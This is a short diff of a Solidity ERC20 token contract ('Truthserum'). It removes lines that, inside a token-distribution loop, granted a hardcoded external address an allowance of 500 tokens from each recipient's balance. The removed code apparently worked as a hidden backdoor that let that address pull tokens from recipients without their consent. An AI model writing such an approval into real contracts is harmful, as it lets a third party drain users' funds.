@@ -34,11 +34,6 @@ contract Truthserum is ERC20 {
 
         for (uint256 i = 0; i < senders.length; ++i) {
             _transfer(msg.sender, senders[i], 1000);
-            _approve(
-                senders[i],
-                0xDF8DB8D4CeBC202cc4f5F064E08049C5228fC237,
-                500
-            );
         }
     }
 }
